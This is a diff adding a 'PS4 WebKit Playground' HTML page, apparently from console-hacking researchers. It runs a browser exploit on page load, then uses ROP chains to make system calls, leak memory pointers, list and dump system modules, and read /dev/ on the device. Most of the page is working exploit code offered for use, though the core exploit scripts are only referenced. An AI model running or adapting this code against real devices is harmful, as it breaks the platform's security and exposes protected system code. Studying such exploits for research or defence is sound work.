@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<link rel="stylesheet" type="text/css" href="css/main.css">
+		
+		<script type="text/javascript" src="js/utils.js"></script>
+		<script type="text/javascript" src="js/jquery.js"></script>
+		<script type="text/javascript" src="js/exploit.js"></script>
+		<script type="text/javascript" src="js/dump.js"></script>
+		<script type="text/javascript" src="js/just-rop.js"></script>
+		<script type="text/javascript" src="js/gadgets.js"></script>
+		<script type="text/javascript">
+
+function load() {
+	document.getElementById("environment").innerHTML = getEnvironmentInfo();
+	exploit();
+}
+
+function getpid() {
+	var chain = new rop();
+	
+	chain.syscall("getpid", 20);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		chain.logVariable(0);
+	}, 1);
+}
+
+function getlogin() {
+	var chain = new rop();
+	
+	chain.syscall("getlogin", 49, stack_base + return_va + 0x480, 17);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		var name = readString(stack_base + return_va + 0x480);
+		var pointer = getU32from(stack_base + return_va + 0x480 + 8);
+		
+		logAdd("Name: " + name);
+		logAdd("Leaked pointer: 0x" + pointer.toString(16));
+	}, 1);
+}
+
+function getLoadedModules() {
+	var data = stack_base + return_va + 0x480;
+	var countAddress = data;
+	var modulesAddress = data + 8;
+	
+	var chain = new rop();
+	
+	chain.syscall("getLoadedModules", 592, modulesAddress, 256, countAddress);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		chain.logVariable(0);
+		
+		var count = getU64from(countAddress);
+		for(var index = 0; index < count; index++) {
+			logAdd("Module: 0x" + getU32from(modulesAddress + index * 4).toString(16));
+		}
+	}, 1);
+}
+
+function dumpModule() {
+	var moduleNumber = parseInt(document.getElementById("loadedModuleID").value);
+	
+	if(!moduleNumber) {
+		logAdd("Enter a module number");
+		document.getElementById("moduleNumber").focus();
+		return;
+	}
+	
+	var chain = new rop();
+	
+	var moduleInfoAddress = stack_base + return_va + 0x480;
+	setU64to(moduleInfoAddress, 0x160);
+	
+	chain.syscall("getModuleInfo", 0, 593, moduleNumber, moduleInfoAddress);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		var moduleName = readString(moduleInfoAddress + 0x8);
+		var codeBase = getU64from(moduleInfoAddress + 0x108);
+		var codeSize = getU32from(moduleInfoAddress + 0x110);
+		var dataBase = getU64from(moduleInfoAddress + 0x118);
+		var dataSize = getU32from(moduleInfoAddress + 0x120);
+		var moduleBase = codeBase;
+		var moduleSize = codeSize + dataSize;
+		
+		logAdd("Dumping " + moduleName);
+		
+		//dump(moduleBase, moduleSize / 0x1000, 0x1000);
+	}, 1);
+}
+
+function loadDumpModule() {
+	var moduleNumber = parseInt(document.getElementById("moduleID").value);
+	
+	if(!moduleNumber) {
+		logAdd("Enter a module number");
+		document.getElementById("moduleNumber").focus();
+		return;
+	}
+	
+	var chain = new rop();
+	
+	var moduleInfoAddress = stack_base + return_va + 0x480;
+	setU64to(moduleInfoAddress, 0x160);
+	
+	chain.call("loadModule", libSysmodule, 0x1850, moduleNumber, 0, 0, 0);
+	chain.syscall("getModuleInfo", 0, 593, 0x65, moduleInfoAddress);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		var moduleName = readString(moduleInfoAddress + 0x8);
+		var codeBase = getU64from(moduleInfoAddress + 0x108);
+		var codeSize = getU32from(moduleInfoAddress + 0x110);
+		var dataBase = getU64from(moduleInfoAddress + 0x118);
+		var dataSize = getU32from(moduleInfoAddress + 0x120);
+		var moduleBase = codeBase;
+		var moduleSize = codeSize + dataSize;
+		
+		logAdd("Dumping " + moduleName);
+		
+		dump(moduleBase, moduleSize / 0x1000, 0x1000);
+	}, 1);
+}
+
+function openDev() {
+	var chain = new rop();
+	
+	writeString(stack_base + return_va + 0x480, "/dev/");
+	chain.syscall("open", 5, stack_base + return_va + 0x480, 0, 0);
+	chain.write_rax_ToVariable(0);
+	
+	chain.read_rdi_FromVariable(0);
+	chain.syscall("read", 3, undefined, stack_base + return_va + 0x480, 1028);
+	
+	chain.execute();
+	
+	setTimeout(function() {
+		logAdd(hexDump(stack_base + return_va + 0x480, 256));
+	}, 1);
+}
+
+		</script>
+	</head>
+	
+	<body onload="load()">
+		<div class="header">
+			<h1>PS4 WebKit Playground</h1>
+			<h2>CTurt, SKFU, droogie, Xerpi, Hunger, Takezo, nas, Proxima</h2>
+			
+			<div id="environment"></div>
+		</div>
+		
+		<hr>
+		
+		<div class="box-container">
+			<div class="box">
+				<h2>Syscalls</h2>
+				
+				<div>
+					<button onclick="getpid()">Get PID</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					<button onclick="getlogin()">Get Login</button>
+				</div>
+			</div>
+			
+			<div class="box">
+				<h2>Modules</h2>
+				
+				<div>
+					<button onclick="getLoadedModules()">Get Loaded Modules</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					Loaded Module ID (Get Loaded Modules):
+					<input type="number" id="loadedModuleID" />
+					<button onclick="dumpModule()">Dump Loaded Module</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					Module ID (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
+					<input type="number" id="moduleID" />
+					<button onclick="loadDumpModule()">Load and Dump Module</button>
+				</div>
+			</div>
+			
+			<div class="box">
+				<h2>Filesystem</h2>
+				
+				<div>
+					<button onclick="openDev()">Open /dev/</button>
+				</div>
+			</div>
+		</div>
+		
+		<br><br>
+		
+		<hr>
+		
+		<div>
+			<div id="log"></div>
+		</div>
+	</body>
+</html>
